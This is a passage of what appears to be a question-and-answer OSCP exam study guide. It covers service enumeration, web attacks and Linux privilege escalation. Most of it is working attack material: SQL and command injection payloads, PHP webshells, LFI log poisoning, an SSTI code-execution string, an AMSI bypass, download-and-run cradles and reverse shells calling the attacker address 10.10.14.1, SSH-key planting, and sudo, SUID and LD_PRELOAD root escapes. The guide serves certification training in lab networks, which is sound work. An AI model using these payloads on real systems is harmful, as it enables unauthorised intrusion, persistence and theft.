    rpcclient -U "" -N $IP -c "queryuser 0x$(printf '%x' $i)" 2>/dev/null | grep "User Name"
done
```

### Q19: FTP enumeration
**A:**

**FTP testing checklist:**

**1. Banner grabbing:**
```bash
nc $IP 21
# Or
nmap -sV -p 21 $IP
```

Check version against known vulnerabilities.

**2. Anonymous login:**
```bash
ftp $IP
# Username: anonymous
# Password: anonymous (or any email)

# Or with credentials
ftp $IP
# Try: ftp/ftp, admin/admin, etc.
```

**3. Browse for files:**
```ftp
ls -la
cd pub
ls -la
get file.txt
binary
mget *
```

**4. Common findings:**
- /etc/passwd readable
- backup files (.bak, .old)
- SSH keys
- Source code
- Configuration files
- Database dumps

**5. FTP exploits to know:**

**vsftpd 2.3.4 backdoor (CVE-2011-2523):**
```bash
# Username with smiley triggers backdoor on port 6200
ftp $IP
# Username: user:)
# Password: anything

# Then in another terminal:
nc $IP 6200
# Root shell!
```

**ProFTPD 1.3.5 - mod_copy:**
```bash
nc $IP 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt

# Now access via web
curl http://$IP/passwd.txt
```

**Anonymous FTP write access:**
```bash
ftp $IP
# Login as anonymous
put shell.php
# If write allowed, upload webshell to web-accessible folder
```

**6. SFTP vs FTP:**

If SFTP (port 22) used:
- SSH key authentication possible
- Encrypted but still need credentials
- chroot jails common

**7. Active vs Passive:**

```bash
# Force passive mode (common firewall issue)
ftp -p $IP

# Or in client
ftp> passive
```

### Q20: SSH enumeration and attacks
**A:**

**SSH testing:**

**1. Version check:**
```bash
nc $IP 22
# Or
nmap -sV -p 22 $IP
ssh $IP    # Just connect, see banner
```

Known SSH vulnerabilities:
- OpenSSH < 7.7 - User enumeration (CVE-2018-15473)
- libssh - Bypass (CVE-2018-10933)
- Specific versions with backdoors

**2. User enumeration (older OpenSSH):**
```bash
# Test if user exists
python3 ssh_user_enum.py --userList users.txt $IP

# Manual: time-based
time ssh nonexistent@$IP
time ssh root@$IP
# Existing users may take different time
```

**3. Authentication methods:**
```bash
ssh -v $IP
# Shows accepted auth methods:
# - password
# - publickey
# - keyboard-interactive
```

**4. SSH brute force (limited use on OSCP):**
```bash
# Hydra
hydra -L users.txt -P passwords.txt ssh://$IP

# Be careful - might lock you out
```

**Note:** OSCP rules: Don't brute force users you weren't told to target.

**5. Found SSH keys:**
```bash
# Permissions matter
chmod 600 id_rsa
ssh -i id_rsa user@$IP

# Test multiple users with key
for user in root admin user developer; do
    ssh -i id_rsa -o StrictHostKeyChecking=no $user@$IP 'whoami' 2>/dev/null
done
```

**6. SSH key password cracking:**
```bash
# If encrypted key
ssh2john id_rsa > id_rsa.hash
john --wordlist=rockyou.txt id_rsa.hash
```

**7. SSH config file analysis:**

If you find .ssh/config:
```
Host bastion
    HostName bastion.internal
    User admin
```

Reveals network topology.

**8. authorized_keys files:**

If you can write to ~/.ssh/authorized_keys of a user:
```bash
# Add your key
echo "ssh-rsa AAAA... attacker" >> /home/victim/.ssh/authorized_keys

# Login as victim
ssh victim@$IP
```

**9. Common credentials to try:**
- root / root
- root / toor
- admin / admin
- user / user
- (banner-specific defaults)

**10. SSH for pivoting:**
```bash
# Local port forward
ssh -L 8080:internal_host:80 user@pivot

# Dynamic SOCKS
ssh -D 1080 user@pivot
proxychains tool target

# Reverse tunnel
ssh -R 8080:localhost:80 user@attacker
```

### Q21: Web app vulnerabilities for OSCP
**A:**

**OSCP web vulnerabilities to master:**

**1. SQL Injection:**

Basic:
```sql
' OR '1'='1
' OR '1'='1' --
admin' --
1' UNION SELECT 1,2,3 --
```

Error-based MySQL:
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version()))) --
```

Union-based:
```sql
# First find columns
' ORDER BY 1 --
' ORDER BY 2 --
# Increment until error

# Find injectable columns
' UNION SELECT 1,2,3 --
# Look for "1", "2", "3" in response

# Extract data
' UNION SELECT 1,database(),3 --
' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database() --
```

Boolean-based blind:
```sql
' AND 1=1 --
' AND 1=2 --
# Different response = injection

' AND SUBSTRING(database(),1,1)='a' --
```

**2. Command Injection:**

```bash
; whoami
| whoami
` whoami `
$(whoami)
&& whoami
```

Bypassing filters:
```bash
# Space restriction
${IFS}whoami
{cat,/etc/passwd}
cat$IFS/etc/passwd

# Slash restriction
${PATH:0:1}etc${PATH:0:1}passwd

# Common commands restricted
w$()hoami
who'a'mi
```

**3. Local File Inclusion (LFI):**

```bash
# Test path traversal
http://target/page.php?file=../../../etc/passwd
http://target/page.php?file=....//....//....//etc/passwd

# URL encoding
http://target/page.php?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Null byte (older PHP)
http://target/page.php?file=../../../etc/passwd%00

# Common targets
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log (Log poisoning)
```

**Log poisoning (LFI → RCE):**
```bash
# 1. Poison log with PHP code via User-Agent
curl http://target -A "<?php system($_GET['cmd']); ?>"

# 2. Include log via LFI
http://target/page.php?file=/var/log/apache2/access.log&cmd=whoami
```

**4. Remote File Inclusion (RFI):**

```bash
# Host malicious PHP
echo "<?php system($_GET['cmd']); ?>" > shell.php
python3 -m http.server 80

# Include
http://target/page.php?file=http://10.10.14.1/shell.php&cmd=id
```

**5. File Upload Bypass:**

```bash
# Common bypasses
# Change Content-Type
Content-Type: image/jpeg

# Double extension
shell.php.jpg
shell.jpg.php

# Case manipulation
shell.PhP

# Null byte
shell.php%00.jpg

# Magic bytes (for image validation)
GIF89a; <?php system($_GET['cmd']); ?>

# .htaccess upload
AddType application/x-httpd-php .pwn
# Then upload shell.pwn
```

**6. XSS (less direct on OSCP but possible):**

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
```

Generally not exam-critical but useful for chaining.

**7. SSTI (Server-Side Template Injection):**

Test:
```
{{7*7}}     → 49 (Jinja2/Twig)
${7*7}      → 49 (FreeMarker)
<%= 7*7 %>  → 49 (ERB)
#{7*7}      → 49 (Ruby)
```

If 49 in response = SSTI.

Exploit:
```python
# Python Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
```

**8. Authentication bypass:**

```sql
admin' --
admin'/*
' or 1=1#
' or 1=1--
' or 1=1/*
'or 1=1
" or 1=1 --
```

**9. Default credentials:**

Common:
- admin/admin
- admin/password
- root/root
- admin/12345
- (Product-specific defaults)

Check ExploitDB and Default Password Database.

**10. Outdated CMS:**

WordPress, Drupal, Joomla often vulnerable:
```bash
# WPScan
wpscan --url http://$IP --enumerate u,p

# Joomscan
joomscan -u http://$IP

# Droopescan
droopescan scan drupal -u http://$IP
```

### Q22: Initial Access Techniques
**A:**

**Common OSCP initial access vectors:**

**1. Public exploit (most common):**

```bash
# Find vulnerable software
nmap -sCV $IP

# Search for exploits
searchsploit "service version"

# Get exploit
searchsploit -m 12345

# Modify if needed (often Python scripts)
# - Update LHOST/LPORT
# - Update target architecture
# - Update shellcode
```

**2. Default credentials:**

Always try first:
- Tomcat: admin/admin, tomcat/tomcat
- Jenkins: admin/admin
- Webmin: admin/admin
- Various: root/root, admin/password

**3. Misconfigurations:**

- Anonymous FTP with sensitive files
- Open NFS shares
- Exposed git directories (.git)
- Exposed environment files (.env)
- Admin panels accessible without auth
- Debug pages enabled

**4. Web application vulnerabilities:**

Covered Q21 - SQLi, LFI, command injection, file upload, SSTI.

**5. Service vulnerabilities:**

Common services with known exploits:
- Tomcat (default creds → upload WAR)
- Apache Struts
- Jenkins (Groovy console for RCE)
- ActiveMQ
- Drupal (Drupalgeddon)
- WordPress (vulnerable plugins)

**6. Brute force (limited):**

OSCP rules: Don't brute force OS-level passwords. But:
- FTP: Brute force allowed in some contexts
- Web logins: Often expected
- Custom services: Allowed

```bash
# Web login
hydra -L users.txt -P passwords.txt $IP http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
```

**7. Credentials from files:**

After getting partial access:
- Config files (web.config, wp-config.php)
- .bashrc, .bash_history
- Database backups
- Memory dumps

**8. SMB null sessions:**

```bash
# Anonymous SMB access
smbclient -L //$IP -N
smbclient //$IP/share -N

# Get sensitive files
get backup.zip
```

**9. Email user enumeration → spray:**

```bash
# SMTP user enumeration
smtp-user-enum -M VRFY -U users.txt -t $IP

# Spray with discovered users
# (For AD environments)
```

**10. Domain credentials given:**

OSCP AD chain often starts with given credentials. Use them effectively:

```bash
# Enumerate with given creds
crackmapexec smb $RANGE -u user -p password

# Find machines they can access
# Find their privileges
# Map the AD
```

**Methodology:**

For each open port, ask:
1. What service is this?
2. What version?
3. Default credentials known?
4. Public exploits available?
5. Common misconfigurations?
6. Authentication required?

If all yes/easy → try first.
If complex → save for later.

### Q23: Service-specific enumeration patterns
**A:**

**Pattern for each service:**

**HTTP/HTTPS (80/443/8080):**

1. Visit in browser
2. View source
3. /robots.txt
4. /sitemap.xml
5. gobuster directory bruteforce
6. whatweb fingerprint
7. Check for common apps (admin panels, CMS)
8. Test common params for SQLi/LFI
9. Check authentication mechanisms
10. Test for default credentials

**SMB (139/445):**

1. nmap -p 445 --script smb-os-discovery
2. enum4linux -a
3. smbmap -H
4. smbclient -L //IP
5. Test null session
6. Check for shares
7. MS17-010 vuln check

**SSH (22):**

1. Banner version check
2. User enumeration if older OpenSSH
3. Authentication methods
4. Default credentials test
5. Don't brute force OS users
6. Look for keys in other places

**FTP (21):**

1. Anonymous login test
2. Version check
3. Browse all directories
4. Download interesting files
5. Test for upload (rare but valuable)
6. Check for known vulns (vsftpd 2.3.4)

**SMTP (25/587):**

1. Banner check
2. VRFY/EXPN for user enumeration
3. Open relay test (less common in modern)
4. Email enumeration for AD users

```bash
# User enumeration
smtp-user-enum -M VRFY -U users.txt -t $IP

# Test methods
nc $IP 25
HELO test
VRFY admin
VRFY administrator
EXPN postmaster
```

**DNS (53):**

1. Zone transfer test
2. Subdomain enumeration

```bash
# Zone transfer
dig axfr @$IP domain.com
nslookup -type=axfr domain.com $IP

# If allowed, get all records
```

**SNMP (161 UDP):**

1. Default community strings (public, private)
2. Walk for info

```bash
snmpwalk -v 2c -c public $IP
snmp-check $IP

# Common interesting OIDs
snmpwalk -v 2c -c public $IP 1.3.6.1.4.1.77.1.2.25  # Users
snmpwalk -v 2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2  # Processes
```

**MSSQL (1433):**

1. Default sa credentials
2. Empty passwords

```bash
# Test default
mssqlclient.py SA@$IP -windows-auth
crackmapexec mssql $IP -u sa -p ''

# Once in
SELECT @@version
EXEC sp_databases
EXEC xp_cmdshell 'whoami'
```

**MySQL (3306):**

1. Default credentials
2. Anonymous access

```bash
mysql -h $IP -u root
mysql -h $IP -u root -p
# Try blank password
```

**RDP (3389):**

1. Don't brute force (OSCP rules)
2. Check version (CVE-2019-0708 BlueKeep)
3. Note for later access via credentials

**WinRM (5985/5986):**

1. Critical for Windows lateral movement
2. Test with discovered credentials

```bash
evil-winrm -i $IP -u user -p password
crackmapexec winrm $IP -u user -p password
```

### Q24: NFS and other network shares
**A:**

**NFS (2049):**

**Enumeration:**

```bash
# List exports
showmount -e $IP

# Output:
# Export list for $IP:
# /shared    *
# /home      192.168.1.0/24
```

**Mount and explore:**

```bash
# Create mount point
mkdir /mnt/nfs

# Mount
mount -t nfs $IP:/shared /mnt/nfs

# Or specific version
mount -o vers=3 $IP:/shared /mnt/nfs

# Browse
ls -la /mnt/nfs
```

**Common attacks:**

**1. UID/GID manipulation:**

If you can write to /etc/passwd of mounted NFS:
- Add root user
- Change permissions

**2. SUID binaries:**

If NFS export has no_root_squash:
```bash
# Create SUID binary as root
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash

# Execute on target as any user
/shared/rootbash -p
# Now you're root
```

**3. SSH key placement:**

If you can write to user home:
```bash
# Add your key
echo "ssh-rsa AAAA... attacker" >> /mnt/nfs/home/user/.ssh/authorized_keys
ssh user@$IP
```

**Common misconfigurations:**

- **no_root_squash** - Root on client = root on share
- **rw export** - Read/write for everyone
- **no_subtree_check** - No path validation
- **insecure** - Allow non-privileged ports

**SMB shares (alternative):**

Covered in Q18. Different protocol but similar concept.

**Other share types:**

**rsync (873):**

```bash
# List modules
rsync $IP::

# List files
rsync $IP::module_name

# Download
rsync $IP::module_name/file ./

# Upload (if writable)
rsync ./file $IP::module_name/
```

**SVN/Git exposed:**

```bash
# Check for git
curl http://$IP/.git/

# Use git-dumper
pip install git-dumper
git-dumper http://$IP/.git/ ./extracted

# Examine commits
cd extracted
git log
git diff
git show <commit>
```

**WebDAV:**

```bash
# Check if WebDAV enabled
curl -X OPTIONS http://$IP -v

# If allowed methods include PUT, MOVE, DELETE:
# Upload webshell
cadaver http://$IP

# Or curl
curl -X PUT -d "<?php system(\$_GET['cmd']); ?>" http://$IP/shell.php
```

**Memcached (11211):**

```bash
# Connect
nc $IP 11211

# Commands
stats
stats items
get key_name
```

**Redis (6379):**

```bash
# Connect (often unauth)
redis-cli -h $IP

# Info
INFO
CONFIG GET *

# RCE technique - write SSH key:
CONFIG SET dir /home/redis/.ssh/
CONFIG SET dbfilename "authorized_keys"
SET key "\n\nssh-rsa AAAA... attacker\n\n"
SAVE
```

### Q25: Subdomain and virtual host discovery
**A:**

**Subdomain enumeration:**

**1. Passive:**

```bash
# subfinder
subfinder -d example.com

# amass
amass enum -d example.com

# crt.sh (certificate transparency)
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sort -u

# theHarvester
theHarvester -d example.com -b all
```

**2. Active (DNS bruteforce):**

```bash
# gobuster DNS
gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# dnsenum
dnsenum example.com

# fierce
fierce --domain example.com
```

**Virtual host discovery:**

Sometimes site responds differently based on Host header.

```bash
# ffuf vhost
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://$IP -H "Host: FUZZ.example.com" -fs $size_of_default_response

# gobuster
gobuster vhost -u http://$IP -w wordlist.txt
```

**Important for OSCP:**

If exam machine has DNS hostname (e.g., target.example.com):
- Try as IP and as hostname
- Test for vhosts
- Different content possible

Common OSCP scenarios:
- /etc/hosts modification needed for some scans
- Multiple vhosts on same IP
- DNS-based routing

```bash
# Add to /etc/hosts
echo "10.10.10.5 target.example.com" >> /etc/hosts

# Then can use hostname
curl http://target.example.com
```

### Q26: WHOIS and OSINT (less OSCP, more general)
**A:**

**OSINT mostly not needed for OSCP** (machines isolated). But:

**1. WHOIS:**
```bash
whois example.com
```

Reveals:
- Registrar
- Contact emails (sometimes)
- Name servers
- Expiry

**2. DNS records:**
```bash
# All records
dig example.com ANY

# Specific
dig example.com A
dig example.com MX
dig example.com TXT
dig example.com NS
```

**3. Search engines:**

Google dorks (not used in OSCP exam):
```
site:example.com
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com intitle:"index of"
```

**4. Wayback Machine:**
- Historical content
- Old endpoints
- Old versions of code

**5. GitHub/GitLab:**
- Public repos
- Leaked credentials
- Sensitive info

**For OSCP specifically:**

Focus on technical recon, not OSINT. Exam is isolated network.

For real pentesting:
- OSINT first (passive)
- Then active scanning
- Then exploitation

### Q27: Vulnerability assessment vs exploitation
**A:**

**Vulnerability assessment:**

Identifying what's vulnerable. Examples:
- Nikto scan results
- nmap script output
- Searchsploit matches

```bash
# Vulnerability scanners (NOT allowed on OSCP exam)
# Nessus, OpenVAS, Qualys = banned

# Allowed:
nmap --script vuln $IP
nikto -h http://$IP
searchsploit "service version"
```

**Exploitation:**

Actually exploiting found vulnerabilities. Examples:
- Running exploit code
- Crafting payloads
- Gaining shell access

**For OSCP:**

Focus more on exploitation than scanning:
- Scanning identifies surface
- Exploitation completes objective

Don't get stuck running scan after scan. Once you have data, exploit.

**Common scanning pitfalls:**

1. **Running automated scanners** (banned)
2. **Scanning too long** - Move to exploitation
3. **Not reading scan output** - Misses obvious finds
4. **Trusting scanner output** - Verify manually

**Reading nmap output critically:**

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache 2.4.18 ((Ubuntu))
```

Then ask:
- Apache 2.4.18 - any CVEs?
- Default page?
- Apps running?
- Tomcat behind it?

Each piece of info = lead.

**Manual verification:**

Scanner says vulnerable to CVE-X.

Don't just take it - verify:
1. Read CVE details
2. Match to your situation
3. Test exploit safely
4. Confirm impact

### Q28: PowerShell and CMD for OSCP
**A:**

**PowerShell on target:**

Once you have shell on Windows:

**1. Disable AMSI:**

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Or use Invisi-Shell.

**2. Download files:**

```powershell
# IEX (in-memory)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1/script.ps1')

# Save to disk
(New-Object Net.WebClient).DownloadFile('http://10.10.14.1/file.exe', 'C:\temp\file.exe')

# certutil (works in CMD too)
certutil -urlcache -split -f http://10.10.14.1/file.exe c:\temp\file.exe
```

**3. Execute commands:**

```powershell
# Run with elevated when bypass possible
powershell -ep bypass -c "Get-Process"

# Run script
powershell -ep bypass -File script.ps1

# Encode (avoid filtering)
$cmd = "Get-Process"
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
powershell -enc $encoded
```

**4. Information gathering:**

```powershell
# System info
systeminfo
$PSVersionTable

# Network
ipconfig /all
arp -a
route print
netstat -ano

# Users
net user
whoami /all

# Domain
whoami /upn
net user /domain
nltest /dclist
```

**5. PrivEsc reconnaissance:**

```powershell
# WinPEAS
.\winpeas.exe

# PowerUp
. .\PowerUp.ps1
Invoke-AllChecks

# Sherlock (kernel exploits)
. .\Sherlock.ps1
Find-AllVulns

# Watson (newer)
.\Watson.exe
```

**CMD on target:**

When PowerShell blocked:

**1. Basic enumeration:**
```cmd
whoami
whoami /all
whoami /priv
hostname
systeminfo
ipconfig /all
net user
net localgroup administrators
net session
schtasks /query /fo LIST /v
```

**2. Files and permissions:**
```cmd
dir /s /b c:\users\*.txt
dir /s /b c:\inetpub\*config*

icacls C:\Windows\System32\config\SAM
accesschk.exe -uws "Everyone" "C:\Program Files"
```

**3. Services:**
```cmd
sc query
sc qc <service>
wmic service get name,displayname,pathname,startmode,startname
```

**4. Stored credentials:**
```cmd
cmdkey /list
runas /savecred /user:admin cmd.exe
```

**Switching from CMD to PowerShell:**
```cmd
powershell -ep bypass
```

### Q29: Linux command essentials for OSCP
**A:**

**Linux enumeration commands:**

**1. System info:**

```bash
uname -a
cat /etc/os-release
cat /etc/issue
hostname
id
whoami
groups
last
w
who
lastlog
```

**2. File system:**

```bash
# Search files by content
grep -r "password" /etc/ 2>/dev/null
grep -r "api_key" / 2>/dev/null

# Find by name
find / -name "*.conf" 2>/dev/null
find / -name "*backup*" 2>/dev/null

# Recently modified
find / -mmin -10 2>/dev/null

# SUID/SGID
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -2000 2>/dev/null

# Writable by all
find / -perm -2 -type f 2>/dev/null

# World-writable directories
find / -perm -2 -type d 2>/dev/null
```

**3. Network:**

```bash
ip a
ifconfig
netstat -tulnp
ss -tulnp
arp -a
route -n
```

**4. Processes:**

```bash
ps aux
ps -ef
top
# Check what's running as root
ps aux | grep root
```

**5. Cron jobs:**

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
crontab -u user -l  # Other user's crontab
```

**6. Sudo:**

```bash
sudo -l
sudo -V  # Version (CVE-2019-14287 etc.)
cat /etc/sudoers 2>/dev/null
cat /etc/sudoers.d/* 2>/dev/null
```

**7. Capabilities:**

```bash
getcap -r / 2>/dev/null
# Specific dangerous capabilities:
# - cap_setuid - can become any user
# - cap_dac_read_search - bypass file read
# - cap_sys_admin - many admin tasks
```

**8. Kernel info:**

```bash
uname -r
# Check against kernel exploits
searchsploit linux kernel $(uname -r)
```

**9. Installed packages:**

```bash
# Debian/Ubuntu
dpkg -l
apt list --installed

# RedHat/CentOS
rpm -qa
yum list installed
```

**10. Containers:**

```bash
# Check if in container
ls /.dockerenv 2>/dev/null
cat /proc/1/cgroup | grep docker

# Docker socket?
ls -la /var/run/docker.sock
```

**Quick wins to look for:**

- /etc/passwd writable (rare but possible)
- /etc/shadow readable (very rare)
- Backup files in /tmp, /var/backups
- Database files
- SSH keys in unusual locations
- .bash_history (commands run by other users)
- /etc/sudoers misconfigurations
- World-readable sensitive files
- Configuration files with passwords

### Q30: Reverse shell stabilization (critical skill)
**A:**

**Why stabilize:**

Initial reverse shells often:
- Can't use Ctrl+C (kills shell)
- No tab completion
- No command history
- Can't use editors properly (vim, nano)
- Backspace doesn't work right

**Method 1: Python pty + stty (most reliable):**

```bash
# After getting shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# (or python instead of python3)

# Now Ctrl+Z to background
^Z

# In your local terminal:
stty raw -echo; fg

# Press Enter twice
# Now set TERM
export TERM=xterm
export SHELL=bash

# Get terminal size
# In local terminal, FIRST run:
stty size
# Output: 50 200 (rows cols)

# In remote shell:
stty rows 50 columns 200
```

Now you have a fully functional shell.

**Method 2: Script command:**

```bash
# In reverse shell
script /dev/null -c bash

# Then same backgrounding process
```

**Method 3: SSH (if you have credentials):**

Once you have user creds, SSH in instead:
```bash
ssh user@$IP
```

Native shell = best experience.

**Method 4: Socat (cleaner):**

```bash
# On attacker
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.1:4444
```

**Method 5: Windows shell upgrades:**

```powershell
# Initial weak shell often nc-style
# Upgrade to PowerShell
powershell -ep bypass

# Or use proper Windows reverse shell
# Nishang Invoke-PowerShellTcp
IEX (iwr 'http://10.10.14.1/Invoke-PowerShellTcp.ps1' -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.1 -Port 4444
```

**Catching shells:**

**Basic netcat:**
```bash
nc -lvnp 4444
```

**Better: rlwrap:**
```bash
rlwrap nc -lvnp 4444
# Gives you readline support (arrows, history)
```

**Even better: pwncat:**
```bash
pip install pwncat-cs
pwncat-cs -lp 4444
# Auto-stabilizes shells
```

**For OSCP exam:**

Be ready with one method memorized. Don't waste time figuring it out during exam.
Recommended: Python + stty raw method.


### Q31: Linux privesc methodology
**A:**

**Systematic approach (run every time):**

**Step 1: Automated enumeration**

```bash
# linpeas - best all-around
curl http://10.10.14.1/linpeas.sh | sh
# Or download then run
wget http://10.10.14.1/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Output: color-coded findings
# Red/Yellow = high probability privesc
```

**Step 2: Manual checks (in case linpeas missed something)**

```bash
# Who am I?
id
whoami
groups

# What can I sudo?
sudo -l

# Kernel
uname -a
cat /etc/os-release

# SUID
find / -perm -4000 -type f 2>/dev/null

# SGID  
find / -perm -2000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Writable /etc/passwd?
ls -la /etc/passwd
ls -la /etc/shadow

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Running processes (especially as root)
ps aux | grep root
ps -ef --forest

# Listening services (might escalate via internal service)
netstat -tulnp
ss -tulnp

# Mounted shares
mount
cat /etc/fstab

# Recent activity
last
w
who

# Environment
env
echo $PATH
```

**Step 3: Categorize findings**

For each finding, assess:
- Is it actually exploitable?
- What's the path to root?
- How quickly can I test it?

**Step 4: Try fastest wins first**

Priority order typically:
1. sudo -l shows easy bypass
2. Writable /etc/passwd
3. SUID with GTFOBins entry
4. Cron job with writable script
5. Sudo + LD_PRELOAD/LD_LIBRARY_PATH
6. Kernel exploit (last resort - risky)

**Common time-wasters to avoid:**

- Kernel exploits without confirming version match
- Compiling exploits without checking architecture
- Trying complex chains when simple sudo works

### Q32: SUID exploitation patterns
**A:**

**Finding SUID binaries:**

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

**Check GTFOBins:**

For every unusual SUID binary, check https://gtfobins.github.io/

**Common SUID privesc patterns:**

**1. find:**
```bash
find . -exec /bin/sh -p \; -quit
# -p preserves SUID bit
```

**2. nmap (older, with --interactive):**
```bash
nmap --interactive
nmap> !sh
```

**3. vim:**
```bash
vim -c ':!/bin/sh'
# Inside vim: :set shell=/bin/sh | shell
```

**4. less / more / man:**
```bash
less /etc/passwd
# Inside less, type !sh
```

**5. python/python3:**
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**6. perl:**
```bash
perl -e 'exec "/bin/sh";'
```

**7. ruby:**
```bash
ruby -e 'exec "/bin/sh"'
```

**8. awk:**
```bash
awk 'BEGIN {system("/bin/sh")}'
```

**9. nano:**
```bash
nano file
# Ctrl+R, Ctrl+X, then: reset; sh 1>&0 2>&0
```

**10. cp:**
```bash
# Overwrite /etc/passwd
echo 'root2::0:0:root2:/root:/bin/bash' > /tmp/passwd_add
cat /etc/passwd /tmp/passwd_add > /tmp/new_passwd
cp /tmp/new_passwd /etc/passwd
su root2
```

**11. tar:**
```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**12. wget:**
```bash
# Overwrite system file or fetch attacker payload
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh -p' > $TF
sudo wget --use-askpass=$TF 0
```

**13. cat / less / more on /etc/shadow:**

If readable, crack hashes offline:
```bash
cat /etc/shadow
# Copy to attacker
unshadow passwd shadow > combined
john --wordlist=rockyou.txt combined
```

**14. Custom SUID binary:**

If you see SUID on /usr/local/bin/script:
```bash
file /usr/local/bin/script
# If shell script - read it, look for $PATH abuse or command injection

# If C binary - check for unsafe functions
strings /usr/local/bin/script
ltrace /usr/local/bin/script
strace /usr/local/bin/script
```

Common patterns:
- Calls system() with relative path → PATH hijacking
- Calls system() with user input → command injection
- Calls exec() unsafely

**PATH hijacking example:**

Binary calls `ps` without full path:
```bash
# Create fake ps in writable location
echo '#!/bin/sh\n/bin/sh -p' > /tmp/ps
chmod +x /tmp/ps

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Run SUID binary
/usr/local/bin/script
# Now you get root shell
```

### Q33: Sudo exploitation
**A:**

**Always run first:**
```bash
sudo -l
```

**Possible outputs and exploits:**

**1. NOPASSWD on everything:**
```
(ALL) NOPASSWD: ALL
```
Direct privesc:
```bash
sudo su
sudo /bin/bash
sudo -u root /bin/sh
```

**2. Specific command, often abuseable:**

Check GTFOBins for any binary listed.

```
(root) NOPASSWD: /usr/bin/find
```
```bash
sudo find . -exec /bin/sh \; -quit
```

```
(root) NOPASSWD: /usr/bin/vim
```
```bash
sudo vim -c ':!/bin/sh'
```

```
(root) NOPASSWD: /usr/bin/python
```
```bash
sudo python -c 'import os; os.system("/bin/sh")'
```

```
(root) NOPASSWD: /bin/tar
```
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```
(root) NOPASSWD: /usr/bin/awk
```
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

**3. Wildcards in sudo command:**

```
(root) NOPASSWD: /usr/bin/tar -czf /backup/* /home
```

The `*` is dangerous:
```bash
# Create files in /home
touch /home/--checkpoint=1
touch /home/--checkpoint-action=exec=sh

# Run sudo, tar expands *, treats them as flags
sudo /usr/bin/tar -czf /backup/asd.tar.gz *
# Triggers shell
```

**4. LD_PRELOAD:**

If `env_keep += LD_PRELOAD` in sudoers:

```bash
# Check
sudo -l | grep -i env_keep

# Create shared library
cat > /tmp/preload.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash");
}
EOF

# Compile
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c

# Run with LD_PRELOAD
sudo LD_PRELOAD=/tmp/preload.so any_allowed_program
```

**5. LD_LIBRARY_PATH:**

If env_keep includes LD_LIBRARY_PATH:

```bash
# Find what library the program uses
ldd /allowed/binary

# Create malicious version of that library
# Place in LD_LIBRARY_PATH location
sudo LD_LIBRARY_PATH=/tmp /allowed/binary
```

**6. Specific text editor:**

```
(root) NOPASSWD: /usr/bin/ed
```
```bash
sudo ed
!/bin/sh
```

**7. less/more for pagers:**

```
(root) NOPASSWD: /usr/bin/less /var/log/syslog
```

Even though file is specified, less can spawn shell:
```bash
sudo less /var/log/syslog
!/bin/sh
```

**8. PATH manipulation with custom scripts:**

```
(root) NOPASSWD: /usr/local/bin/script.sh
```

If script uses relative commands:
```bash
# Read the script
cat /usr/local/bin/script.sh
# If it calls e.g. "service" without full path:

# Create fake service
echo '#!/bin/bash\n/bin/bash' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
sudo /usr/local/bin/script.sh
```

**9. sudo version exploits:**

```bash
sudo -V

# CVE-2019-14287 (sudo < 1.8.28):
# If sudoers has: (ALL, !root) /bin/bash
sudo -u#-1 /bin/bash
# -u#-1 = root despite !root

# CVE-2021-3156 (Baron Samedit) - sudo < 1.9.5p2:
# Buffer overflow in sudoedit
```

**10. Sudo timestamp reuse:**

If admin recently sudo'd:
```bash
# Check if timestamp valid
sudo -n true && echo "Can sudo without password"
```

Some sudo configs allow sudo for 5-15 minutes after first use.

### Q34: Cron job exploitation
**A:**

**Finding cron jobs:**

```bash
# System cron
cat /etc/crontab
ls -la /etc/cron.*
ls -la /etc/cron.d/

# User crontabs
crontab -l  # Your own
ls -la /var/spool/cron/crontabs/ 2>/dev/null

# Watch for new processes (pspy)
./pspy64
```

**pspy is essential** for finding crons you can't read:

```bash
